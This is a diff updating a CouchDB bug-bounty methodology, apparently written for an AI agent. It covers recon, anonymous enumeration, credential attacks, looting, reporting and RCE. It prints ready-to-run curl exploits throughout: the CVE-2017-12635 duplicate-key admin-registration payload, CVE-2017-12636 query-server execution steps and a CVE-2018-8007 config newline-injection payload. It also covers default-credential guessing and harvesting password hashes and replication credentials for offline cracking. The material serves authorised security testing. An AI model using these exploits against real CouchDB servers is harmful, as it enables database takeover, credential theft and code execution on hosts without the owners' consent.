@@ -3,22 +3,34 @@ technology: "CouchDB"
 kind: bug-bounty-methodology
 audience: ai-agent
 family: databases
-version: "1.0"
-source: "corpus-SILENT after strict re-gate (0 writeups — estimated matches were substring noise; adjudication in internal coverage ledger) + upstream-verified (docs.couchdb.org official CVE pages 2017-12635 & 2017-12636, CouchDB 3.5 docs: security intro + server API, discoverer writeup justi.cz 2017-11-14) + rewritten from HackTricks (src/network-services-pentesting/5984-pentesting-couchdb.md), CC BY-NC 4.0, accessed 2026-11-13 (CVE-2018-8007 re-verified against NVD; nmap NSE + metasploit module + API endpoints re-verified against nmap nsedoc / module source / official API docs)"
-provenance: "hybrid: corpus-grounded (5 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
+version: "1.1"
+last-refresh: "2026-11-19"
+source: "corpus-SILENT after strict re-gate (0 writeups — estimated matches were substring noise; adjudication in internal coverage ledger) + upstream-verified (docs.couchdb.org official CVE pages 2017-12635 & 2017-12636, CouchDB 3.5 docs: security intro + server API, discoverer writeup justi.cz 2017-11-14) + rewritten from HackTricks (src/network-services-pentesting/5984-pentesting-couchdb.md), CC BY-NC 4.0, accessed 2026-11-13 (CVE-2018-8007 re-verified against NVD; nmap NSE + metasploit module + API endpoints re-verified against nmap nsedoc / module source / official API docs); v1.1 supplement: AI senior-reviewer pass (GPT-6.1 Sol via M365 Copilot) + dual fact-check (agent-side and reviewer-side web verification against docs.couchdb.org, couchdb blog, NVD, oss-security)"
+provenance: "hybrid: corpus-grounded (5 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line. v1.1 supplement 2026-11-19 (model gpt-6.1-sol via M365 Copilot senior-review pass; all claims dual-verified against docs.couchdb.org release notes/CVE pages, blog.couchdb.org, NVD, oss-security 2026-10-20 posting): version-gate table replaces version-banner reasoning (1.7.0/2.1.1 first-fixed boundary nuance recorded; CVE-2022-24706 through 3.2.1; three 2026 CVEs ≤3.5.2 fixed in 3.5.3), 1.x-vs-2.x config route matrix, /_session identity verification before Admin Party claims, PBKDF2 1.3.0 correction, exploit-primitive gating (duplicate-key payload handling, query-server staging steps), prefixed-system-database attack surface (CVE-2026-90800), object-form replication credential disclosure (CVE-2026-107755), weatherreport admin→OS-user RCE (CVE-2026-86471), junior-pitfall table, severity rubric."
 ---
 
 # CouchDB bug-bounty methodology
 
 Companion overview: [[couchdb]].
 
-Scope note: no observed engagement attacks CouchDB (the "5984" matches were hex fragments, line numbers, file sizes). Every command below is derived from the official API docs and the CVE discoverers' own publications — treat as upstream-verified, not observed-in-the-wild.
+Scope note: no observed engagement attacks CouchDB (the "5984" matches were hex fragments, line numbers, file sizes). Every command below is derived from the official API docs and the CVE discoverers' own publications — treat as upstream-verified, not observed-in-the-wild. A version banner is a *lead*, never proof: every chain below has per-primitive gates that must be validated independently.
+
+Version gate (read first):
+
+| Fact (verified against upstream) | Consequence for the hunt |
+| --- | --- |
+| CVE-2017-12635/12636 first fixed in **1.7.0 / 2.1.1** (release notes + NVD: "before 1.7.0 and 2.x before 2.1.1"); Apache advisories recommend 1.7.1/2.1.1 | Treat `<1.7.0` and `2.0.0–2.1.0` as the unauth-chain band; 1.7.0/1.7.1 boundary is a recorded source discrepancy — when in doubt, test the primitive instead of arguing the banner |
+| CVE-2022-24706 (default Erlang cookie → RCE) affects improperly secured installs through **3.2.1**; 3.2.2 refuses the former default cookie and rebinds ports | "3.x" does NOT mean safe: 3.0–3.2.1 with a default cookie is still the Erlang-node RCE — check epmd/4369 whenever 5984 is locked down |
+| CVE-2026-86471 (**weatherreport**: unsanitised runtime config → shell commands as the OS user, server-admin prerequisite) — ≤3.5.2, fixed 3.5.3 (2026-10-12) | Fresh admin→RCE path on current-ish installs: any config-writing admin on ≤3.5.2 |
+| CVE-2026-90800 (prefixed system dbs `_users*`/`_replicator*`: admin-only `_all_docs`/`_changes` restriction not enforced in chttpd) — ≤3.5.2, fixed 3.5.3 | Unauthenticated read of prefixed user/replicator databases on ≤3.5.2 — probe `_users_x/_all_docs` style names wherever multi-tenant prefixes exist |
+| CVE-2026-107755 (object-form replication URLs: credentials not redacted for non-owner readers) — ≤3.5.2, fixed 3.5.3 | Authenticated user reads *other users'* replication credentials — loot primitive on any ≤3.5.2 with replications |
+| Since 3.0.0: admin account required at *startup*; `/_all_dbs` admin-only; new dbs default admin-only; node-local port 5986 **removed** (moved under 5984 `/_node/...`) | A 3.x in Admin Party is a misconfigured/legacy upgrade, not a stock install. Port 5986 is a 2.x-only discovery signal. A denied `/_all_dbs` proves nothing about a *known* db name |
 
 ## Phase 0 — Recon
 
 ```
 5984/tcp open  http    CouchDB httpd (Erlang OTP)
-nmap -sV -p 5984,5986 198.51.100.x
+nmap -sV -p 5984,5986,4369 198.51.100.x     # 5986 = 2.x-only node-local; 4369 = epmd (Erlang branch)
 ```
 
 Fingerprint and version-gate in one request:
@@ -28,31 +40,36 @@ curl -s http://198.51.100.x:5984/
 # {"couchdb":"Welcome","version":"2.1.0","vendor":{"name":"The Apache Software Foundation"}}
 ```
 
-Version decision: `1.x < 1.7.1` or `2.x < 2.1.1` → the unauthenticated 12635→12636 RCE chain is live (skip to Phase 3). `3.x` → Phases 1-2 (setup/misconfig), and 12635/12636 are patched.
+Version decision: `1.x < 1.7.0` or `2.0.0–2.1.0` → the unauthenticated 12635→12636 chain is *potentially* live (validate each primitive — Phase 3). `≤3.2.1` → Erlang-cookie branch (tool map). `≤3.5.2` → the three 2026 CVEs above are live primitives to test. Current stable is 3.5.3 (Erlang/OTP 27 minimum) — anything older has a dated, citable reason to be interesting.
+
+Record the identity context before any conclusion: `GET /_session` returns `userCtx` — the effective identity for your requests. A proxy injecting auth, a remembered cookie, or an intermediary answering can fake "Admin Party"; verify what identity actually answered.
 
 ## Phase 1 — Anonymous enumeration
 
 ```bash
-curl -s http://198.51.100.x:5984/_all_dbs          # list every database
+curl -s http://198.51.100.x:5984/_all_dbs          # admin-only since 3.0; open on party/1.x/2.x
 curl -s http://198.51.100.x:5984/_uuids?count=1     # liveness
-curl -s http://198.51.100.x:5984/_active_tasks      # admin-gated: 401/403 = admin exists; 200 = Admin Party
-curl -s http://198.51.100.x:5984/_node/_local/_config   # admin-gated config: 200 = party/full admin
+curl -s http://198.51.100.x:5984/_active_tasks      # admin-gated
+curl -s http://198.51.100.x:5984/_node/_local/_config   # admin-gated config (2.x+ route; 1.x uses /_config)
 ```
 
-`_all_dbs` on an open deployment hands over the whole data map: app dbs, `_users`, `_replicator`, `_global_changes`. Walk documents:
+`_all_dbs` discloses *names*, not read access — each db's authorization is separate (and since 3.0 a blocked listing says nothing about a known db name from scope or app traffic; `_global_changes` is optional and may not exist). Walk documents:
 
 ```bash
 curl -s http://198.51.100.x:5984/<db>/_all_docs?include_docs=true
-curl -s http://198.51.100.x:5984/_users/_all_docs?include_docs=true   # user docs (+password hashes in old 1.x)
+curl -s http://198.51.100.x:5984/_users/_all_docs?include_docs=true   # listing _users is admin-only; hash scheme below
 ```
 
-Decision: `/_active_tasks` or `/_config` returning 200 without credentials = **Admin Party** (no `[admins]` configured) → go straight to Phase 4 (12636 works directly, no need for 12635).
+Decision: `/_active_tasks` or config returning 200 *with `/_session` confirming `userCtx: null`* = **Admin Party** (no `[admins]` effective for your requests) → admin-gated primitives open directly. But Admin Party removes an *authentication* prerequisite only — it does not resurrect a patched execution primitive (12636/8007 fixes still apply per version).
+
+Config route matrix (juniors break here): 1.x uses `/_config/...`; 2.x+ uses node-qualified `/_node/<node>/_config/...` (`_local` = the node that answered *this* request, not a stable cluster-wide target; get real node names from `/_membership`). A 404 from a wrong-generation route is not a patch result.
 
 ## Phase 2 — Credential attacks (when an admin exists)
 
-- Try `admin:admin`, `admin:password`, `couchdb:couchdb` — the docs' own examples use exactly these, and they leak into real installs.
-- Old 1.x `_users` docs stored derivable password hashes (weak SHA-1 scheme pre-1.2, pbkdf2 after); with any read of `_users` grab them for offline cracking.
-- Basic auth is universal: `curl -u user:pass` on every endpoint; check per-db `_security` docs for member/admin lists that enumerate valid names.
+- Try `admin:admin`, `admin:password`, `couchdb:couchdb` — the docs' own examples leak into real installs.
+- `_users` password hashes: PBKDF2 since **1.3.0** (configurable work factor; older = weak scheme). Inspect the stored `password_scheme`/`iterations`/`derived_key`/`salt` fields rather than deriving from the banner. Server-admin credentials live in `[admins]` config, *not* `_users` — those are different populations.
+- Basic auth is default but not universal — it can be removed from the authentication-handler chain (proxy auth, JWT, cookies). Establish the configured handlers first; since 3.4 a successful Basic auth also returns a session cookie (keep anonymous and authenticated testing separated).
+- Per-db `_security` enumerates member/admin names; `validate_doc_update` functions carry additional write restrictions `_security` does not show.
 
 ## Phase 3 — CVE-2017-12635: unauthenticated admin self-registration (verified)
 
@@ -60,6 +77,7 @@ Mechanism (official advisory + discoverer Max Justicz): CouchDB validated `_user
 
 ```bash
 curl -X PUT 'http://198.51.100.x:5984/_users/org.couchdb.user:oops' \
+  -H 'Content-Type: application/json' \
   --data-binary '{
     "type": "user",
     "name": "oops",
@@ -71,52 +89,34 @@ curl -X PUT 'http://198.51.100.x:5984/_users/org.couchdb.user:oops' \
 # the stored/authorized context carries _admin (Erlang sees the first key)
 ```
 
-Then authenticate as the new admin (the password is set through the same PUT):
+Evidence discipline: send the payload raw — never round-trip it through a JSON tool that collapses duplicate keys. A successful PUT is *registration*, not yet *escalation*: prove effective authorization separately (read admin-gated config as the new user):
 
 ```bash
-curl -u oops:password http://198.51.100.x:5984/_node/_local/_config   # now readable
+curl -u oops:password http://198.51.100.x:5984/_node/_local/_config   # now readable = escalation proven
 ```
 
-Note the discoverer's warning: the Fauxton GUI shows the account with *empty* roles (JS-parsed), so the escalation hides from casual inspection. Affects every release before 1.7.1 / 2.1.1.
+The Fauxton GUI shows the account with *empty* roles (JS-parsed) — the escalation hides from casual inspection (discoverer's warning). Band: `<1.7.0` / `2.0.0–2.1.0` (see version gate for the 1.7.0/1.7.1 advisory discrepancy).
 
 ## Phase 4 — RCE paths for an admin
 
-**CVE-2017-12636 (query servers)** — admins can define query-server languages whose configured command is executed when a view in that language runs (upstream: "a feature which is basically just a wrapper around execv"). Fixed in 1.7.1/2.1.1; on vulnerable versions, register a new query server whose binary is an interpreter under your control, then trigger it with a design document:
+**CVE-2017-12636 (query servers)** — admins define query-server languages whose configured command runs when a view in that language executes (upstream: "a feature which is basically just a wrapper around execv"). Band: same as 12635. The command executes *on the CouchDB host as the CouchDB OS user* — staging is yours:
 
 ```bash
-# 1. point a new "lang" at an attacker-reachable process (classic form, many variants)
+# 1. point a new "lang" at a process you placed on the host (placement is a separate primitive)
 curl -X PUT http://198.51.100.x:5984/_node/_local/_config/query_servers/cmd \
-  -u oops:password -d '"/tmp/p.sh"'          # script fetched/written by other means
-# 2. create a design doc whose language is the new one — rendering the view executes it
+  -u oops:password -d '"/tmp/p.sh"'
+# 2. design doc with a NAMED view in that language (an empty views{} defines nothing to query)
 curl -X PUT http://198.51.100.x:5984/<db>/_design/shell -u oops:password \
-  -H 'Content-Type: application/json' -d '{"language":"cmd","views":{}}'
+  -H 'Content-Type: application/json' -d '{"language":"cmd","views":{"v":{"map":"x"}}}'
+# 3. QUERY the view — invocation is what executes the query server, not saving the design doc
+curl -u oops:password 'http://198.51.100.x:5984/<db>/_design/shell/_view/v'
 ```
 
-The metasploit `apache_couchdb_cmd_exec` module automates the pair (12635+12636) — on unauth targets it needs nothing else.
+Separate the four gates in evidence: config accepted → design doc created → query-server invoked → execution observed. The metasploit `apache_couchdb_cmd_exec` module automates the full pair with its own staging; the excerpt flow above is the manual equivalent.
 
-**Post-2017 admin RCE surface** — 12636 was fixed, but the class remains: `/_node/_local/_config` exposes `external` handlers, `os_process` settings and (in some installs) replication targets that fetch URLs server-side. Any admin = at minimum SSRF + config disclosure; treat admin on CouchDB as one step from execution and hunt the instance's specific config.
+**CVE-2026-86471 (weatherreport) — the current admin→OS-user path.** ≤3.5.2: the `weatherreport` diagnostics module built shell commands from unsanitised *runtime configuration values* — a server admin who can write config through `/_node/_local/_config` gets arbitrary shell commands as the CouchDB OS user (CVSS 4.0: 9.3; fixed 3.5.3, which switched to `spawn_executable` with argument lists). From an offensive seat: on any ≤3.5.2 where you hold config-write, this is RCE — check any config value that flows into weatherreport's checks before inventing new ones.
 
-## Phase 5 — Looting and escalation
-
-- `/_node/_local/_config` full read: replication endpoints, CORS, and `[admins]` entries — pbkdf2 hashes (`-pbkdf2-<hash>,<salt>,<iterations>`) crack offline; occasionally still plaintext after a manual edit.
-- `/_users/_all_docs`: every account + hashed passwords; `_replicator` docs hold source/target URLs with embedded credentials (`http://user:pass@internal-host:5984/db`) — internal-network recon gold.
-- Per-db `_security` and `_design` docs: map the app's authz model and any view functions doing something dangerous.
-
-## Phase 6 — Reporting
-
-Rank: unauth RCE (12635+12636 chain) > Admin Party config access > SSRF via replication/config > credential/table disclosure > weak admin creds. Recommend: admins configured with strong secrets (3.x enforces on fresh installs), 5984 never directly exposed (Fauxton included), version ≥ current 3.x, replication targets audited for embedded creds.
-
-## Tool map (prose)
-
-curl for the whole API (CouchDB is HTTP end to end); Fauxton (bundled `/_utils` console) for interactive browsing; metasploit's `apache_couchdb_cmd_exec` module for the 12635+12636 chain, and its `apache_couchdb_erlang_rce` module for the separate default-Erlang-cookie distribution-port issue (epmd/4369 — check it when 5984 is locked down); hashcat/john for pbkdf2 admin hashes; jq to slice the JSON. The tools vault holds per-tool notes.
-
-## Supplement (2026-11-13): CVE-2018-8007, scanner coverage, and more enumeration endpoints
-
-Rewritten from HackTricks (src/network-services-pentesting/5984-pentesting-couchdb.md), CC BY-NC 4.0, accessed 2026-11-13; every CVE number and tool claim below re-verified against primary sources (NVD for the CVE, nmap nsedoc and the metasploit module source for the scanners) before writing.
-
-### CVE-2018-8007 — config-API injection for an admin (the 12636 class, one year later)
-
-NVD/CVE-2018-8007 (affected per NVD ranges: 1.x through 1.7.1 and 2.0.0–2.1.1): CouchDB validated administrator-supplied configuration values insufficiently, so a **config-writing admin could escape the config blacklist and escalate to the OS user running CouchDB**. The working primitive is newline injection through the config API — PUT a value for `cors/origins` whose payload opens a new INI section:
+**CVE-2018-8007 — config-API injection (fixed 1.7.2 / 2.1.2).** A config-writing admin escapes the config blacklist via newline injection — PUT a value whose payload opens a new INI section:
 
 ```bash
 curl -X PUT 'http://198.51.100.x:5984/_node/couchdb@localhost/_config/cors/origins' \
@@ -124,29 +124,63 @@ curl -X PUT 'http://198.51.100.x:5984/_node/couchdb@localhost/_config/cors/origi
   -d '"example.com\n\n[os_daemons]\nreaper = /usr/local/bin/reap.sh"'
 ```
 
-The injected `[os_daemons]` entry names a program the daemon spawns (os_daemons are restarted on config change — and on daemon restart), so the write becomes execution as the CouchDB OS user once the process cycle picks it up. Gating to verify before reporting: the account needs config-write rights (an admin, or Admin Party), and the deployment must actually persist the change into a writable `local.ini` — hardened layouts mark the file read-only, which blocks the disk-write half even when the API accepts the PUT. This is the concrete instance of the "the class remains" warning in Phase 4: the 2017 query-server fix did not close config-to-execution, and 8007 is the follow-on proof.
+The injected `[os_daemons]` entry names a program spawned by the daemon (restarted on config change), so the write becomes execution as the CouchDB OS user once the cycle picks it up. Gates before reporting: config-write rights, persistence into the (writable) configuration chain — CouchDB reads an ordered chain of INI files, not literally only `local.ini`; read-only layouts block the disk-write half even when the API accepts the PUT. Exact payload/INI recipe is upstream-advisory-grounded but not lab-reproduced here — treat the *class* (config → section injection → os_daemons) as the technique and verify the instance.
 
-### Scanner coverage (quick first pass)
+**Post-fix admin surface** — config read alone still yields: `external` handlers, `os_process` settings, replication targets (server-side fetch = SSRF primitive to demonstrate, not assume — config *read* does not imply config *write*, and `config_whitelist` may restrict writes). Any admin on CouchDB is one config-write away from the classes above; hunt the instance's specific config.
+
+## Phase 5 — Looting and escalation
+
+- `/_node/_local/_config` full read: `[admins]` pbkdf2 hashes (`-pbkdf2-<hash>,<salt>,<iterations>`) crack offline; occasionally plaintext after a manual edit.
+- `/_users/_all_docs` (admin): accounts + hashes. `_replicator` docs: source/target URLs with embedded credentials (`http://user:pass@internal-host:5984/db`) — internal-network recon gold.
+- **CVE-2026-90800 (≤3.5.2): prefixed system databases** — `_users<suffix>`/`_replicator<suffix>` variants exist on multi-tenant setups with bespoke ACLs; the admin-only gate on `_all_docs`/`_changes` was not enforced for them, so *any* request could read full contents. Probe prefixed names wherever the deployment hints at them — this is unauthenticated loot on current-ish versions.
+- **CVE-2026-107755 (≤3.5.2): object-form replication creds** — as any authenticated user, read replication docs whose source/target are URL *objects* (not strings): other users' credentials were not redacted. String-form URLs were redacted; the object form was the miss.
+- `/_scheduler/jobs` / `/_scheduler/docs`: replication source/target per job — passwords are masked in current output; on ≤3.5.2 combine with 107755 instead.
+- Per-db `_security` and `_design` docs: the app's authz model and view functions worth reading.
+
+## Phase 6 — Reporting
+
+Severity is a rubric (demonstrated access, privilege, scope, credential validity), not a fixed ladder — weak admin creds can be full admin compromise; "config access" on a config-writable ≤3.5.2 *is* the RCE. Report each primitive with its own proof: request bytes, effective identity (`/_session`), response, and observed effect. Remediation line for the report: current 3.5.3, admins with strong secrets, 5984/4369 not exposed, replication creds audited.
+
+## Junior-tester pitfalls (top failure modes)
+
+| Likely mistake | Consequence |
+| --- | --- |
+| Version banner read as confirmed RCE | Report dies in triage — each primitive has its own gates |
+| Any anonymous 200 called "Admin Party" | Proxy auth/cookie/intermediary never excluded; wrong root cause |
+| Stopping when `/_all_dbs` is 401 | Known db names from scope/app traffic never tested directly |
+| 2.x `_node` route used against 1.x (or reverse) | 404 mistaken for "patched" |
+| JSON tool "cleaning up" the 12635 payload | Duplicate keys collapsed — the exploit silently stops working |
+| Saving a design doc and calling it execution | View never queried; query-server never invoked |
+| DB-admin confused with server-admin | Config endpoints 403 misread as "not vulnerable" |
+| Copying the 8007 INI payload into a read-only layout | API accepts, disk half fails, chain silently dead |
+| Erlang RCE assumed from open 4369 alone | 4369 is the mapper; the distribution port + cookie state decide |
+
+## Tool map (prose)
+
+curl for the whole API (CouchDB is HTTP end to end); Fauxton (bundled `/_utils`) for interactive browsing; metasploit `apache_couchdb_cmd_exec` for the 12635+12636 chain and `apache_couchdb_erlang_rce` for the Erlang-cookie branch (CVE-2022-24706 band: ≤3.2.1; 3.2.2+ refuses the default cookie) — epmd/4369 first, then the actual distribution port; hashcat/john for pbkdf2 admin hashes; jq to slice the JSON. The tools vault holds per-tool notes.
+
+## Supplement (2026-11-13): scanner coverage and enumeration endpoints
+
+Rewritten from HackTricks (src/network-services-pentesting/5984-pentesting-couchdb.md), CC BY-NC 4.0, accessed 2026-11-13; CVE numbers and tool claims re-verified against primary sources before writing (scanner output is triage, not evidence — record tool version and routes).
 
 ```bash
 nmap -sV --script couchdb-databases,couchdb-stats -p 5984 198.51.100.x
-# metasploit: auxiliary/scanner/couchdb/couchdb_enum  (CouchDB Enum Utility; TARGETURI defaults to /_all_dbs)
+# metasploit: auxiliary/scanner/couchdb/couchdb_enum  (TARGETURI defaults to /_all_dbs)
 ```
 
-nmap's `couchdb-databases` NSE pulls the database list, `couchdb-stats` the server statistics; the metasploit enum module walks `_all_dbs` plus per-db info. Useful for triage; the manual curl flow in Phases 1-5 stays the primary method because it carries auth cleanly.
+Additional documented endpoints worth a GET (official API reference):
 
-### Additional documented endpoints worth a GET
+- `/_membership` — `cluster_nodes`/`all_nodes`: real node names for `_node/{node}` config routes.
+- `/_scheduler/jobs`, `/_scheduler/docs` — replication jobs incl. source/target per job (passwords masked; ≤3.5.2 see CVE-2026-107755).
+- `/_cluster_setup` — setup-wizard state; standalone vs cluster mid-setup.
+- `/_node/_local/_stats`, `/_node/_local/_system` — statistics.
+- `/_up` — liveness (404 when `maintenance_mode` true/nolb).
+- `/_reshard` — resharding state. `/_db_updates` — db event feed (needs `_global_changes`).
+- TLS twin: **6984** — scan alongside; Shodan `port:5984 couchdb` for external discovery.
 
-Beyond `_all_dbs`/`_uuids`/`_active_tasks`/`_config` from Phase 1 (all from the official API reference):
+## References (v1.1 verification trail)
 
-- `/_membership` — `cluster_nodes` and `all_nodes`: the cluster's node names (Erlang node names are also the `_node/{node}` path segments for config writes).
-- `/_scheduler/jobs` and `/_scheduler/docs` — replication jobs and replication-document states including **source and target for each replication** — same loot class as `_replicator` docs (embedded credentials in URLs) without needing that db to be readable.
-- `/_cluster_setup` — cluster setup-wizard state; distinguishes a standalone node from a cluster member mid-setup.
-- `/_node/_local/_stats` and `/_node/_local/_system` — server and system statistics.
-- `/_up` — liveness/up-status (404 when `maintenance_mode` is true or nolb).
-- `/_reshard` — resharding job counts and state.
-- `/_db_updates` — database event feed (requires the `_global_changes` db to exist).
-
-Also: the TLS listener convention is **6984** (HTTPS twin of 5984) — scan it alongside 5984/5986; and for external discovery, Shodan `port:5984 couchdb`.
-
-(HackTricks' remaining content — banner fingerprinting, the 401-vs-party decision, database/document walk commands, CVE-2017-12635/12636, and the Erlang-cookie/EPMD cluster angle — was already covered more deeply in Phases 0-4 and the tool map above.)
+- docs.couchdb.org CVE pages: 2026-86471, 2026-90800, 2026-107755, 2018-8007, 2020-1955 context; oss-security 2026-10-20 announcement (CVE-2026-86471, CVSS 4.0 9.3).
+- docs.couchdb.org whatsnew: 3.0 (admin-at-startup, `_all_dbs` admin-only, secure new-db defaults, 5986 removed), 3.5 (3.5.3, 2026-10-12, Erlang/OTP 27 minimum, credential-stripping fixes), 1.3.0 (PBKDF2); blog.couchdb.org CVE-2018-8007 (fixed 1.7.2/2.1.2) and "Road to 3.0: Security".
+- NVD CVE-2017-12635 ("before 1.7.0 and 2.x before 2.1.1") vs Apache advisory recommendation (1.7.1/2.1.1) — recorded discrepancy.
+- CVE-2022-24706 band: ≤3.2.1 affected; 3.2.2 rejects default Erlang cookie (upstream release notes).
